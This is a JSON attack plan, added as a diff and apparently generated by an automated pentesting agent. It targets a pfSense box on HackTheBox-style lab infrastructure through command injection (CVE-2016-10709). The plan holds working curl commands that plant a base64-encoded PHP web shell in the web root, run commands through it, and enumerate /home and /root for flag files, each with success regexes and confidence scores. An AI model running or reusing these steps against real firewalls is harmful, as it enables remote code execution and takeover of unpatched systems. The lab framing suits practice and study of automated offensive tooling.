@@ -1,0 +1,130 @@
+{
+  "plan_id": "plan_1734624095_001",
+  "target_ip": "10.129.1.221",
+  "context_hash": "pfsense_lighttpd_1435_weak_security",
+  "attack_vectors": [
+    {
+      "vector_id": "vec_01",
+      "priority": 1,
+      "action": {
+        "tool_name": "exploit_runner",
+        "command_template": "curl -k 'https://{target}:443/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+\"{base64_payload}\">shell.php'",
+        "parameters": {
+          "target": "10.129.1.221",
+          "base64_payload": "PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTs/Pg==",
+          "timeout_seconds": 30
+        }
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "RCE",
+          "mitre_id": "T1190",
+          "cve_id": "CVE-2016-10709"
+        },
+        "hypothesis": {
+          "confidence_score": 0.85,
+          "rationale_tags": [
+            "pfsense_identified",
+            "lighttpd_1435",
+            "known_cve",
+            "manual_bypass_required"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "http_status",
+          "match_pattern": "200|302",
+          "negative_pattern": "(404 Not Found|500 Internal Server Error|Access Denied)"
+        }
+      },
+      "rag_context": {
+        "payload_snippet": "/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+",
+        "insight": "Public exploit 38 and 39709 for pfSense are unreliable due to strict input filtering. Manual exploitation techniques are necessary to bypass these restrictions.",
+        "exploitation_logic": "Base64 encoding to bypass filtering mechanisms and achieve RCE via command injection in database parameter",
+        "vulnerability_context": "pfSense RCE vulnerability via command injection in status_rrd_graph_img.php parameter, requiring manual payload encoding",
+        "source": "htb_sense1_writeup"
+      }
+    },
+    {
+      "vector_id": "vec_02",
+      "priority": 2,
+      "action": {
+        "tool_name": "exploit_runner",
+        "command_template": "curl -k 'https://{target}:443/shell.php?cmd=id'",
+        "parameters": {
+          "target": "10.129.1.221",
+          "timeout_seconds": 15
+        }
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "Command_Execution",
+          "mitre_id": "T1059",
+          "cve_id": "CVE-2016-10709"
+        },
+        "hypothesis": {
+          "confidence_score": 0.8,
+          "rationale_tags": [
+            "webshell_verification",
+            "command_execution",
+            "pfsense_rce"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "regex_match",
+          "match_pattern": "(uid=|gid=|groups=)",
+          "negative_pattern": "(404 Not Found|Parse error|shell.php not found)"
+        }
+      },
+      "rag_context": {
+        "payload_snippet": "Access created writeup.php file with cmd parameter to execute commands",
+        "insight": "Successful exploitation of pfSense RCE vulnerability via command injection in status_rrd_graph_img.php parameter",
+        "exploitation_logic": "Execute commands through uploaded PHP shell to verify RCE and gather system information",
+        "vulnerability_context": "Command execution verification after successful payload upload",
+        "source": "htb_sense1_writeup"
+      }
+    },
+    {
+      "vector_id": "vec_03",
+      "priority": 3,
+      "action": {
+        "tool_name": "exploit_runner",
+        "command_template": "curl -k 'https://{target}:443/shell.php?cmd=find+/home+/root+-name+\"*.txt\"+2>/dev/null'",
+        "parameters": {
+          "target": "10.129.1.221",
+          "timeout_seconds": 20
+        }
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "Information_Gathering",
+          "mitre_id": "T1083",
+          "cve_id": "CVE-2016-10709"
+        },
+        "hypothesis": {
+          "confidence_score": 0.75,
+          "rationale_tags": [
+            "flag_enumeration",
+            "file_discovery",
+            "privilege_escalation_prep"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "regex_match",
+          "match_pattern": "(\\.txt|/home/|/root/)",
+          "negative_pattern": "(Permission denied|No such file)"
+        }
+      },
+      "rag_context": {
+        "payload_snippet": "Establish reverse shell or retrieve flags from /home/{{USER}} and /{{USER}}/{{USER}}.txt",
+        "insight": "pfSense compromise enables access to system files and potential flag locations",
+        "exploitation_logic": "Use established command execution to locate sensitive files and flags",
+        "vulnerability_context": "Post-exploitation file enumeration on compromised pfSense system",
+        "source": "htb_sense1_writeup"
+      }
+    }
+  ],
+  "created_at": "2024-12-19T13:41:35Z"
+}
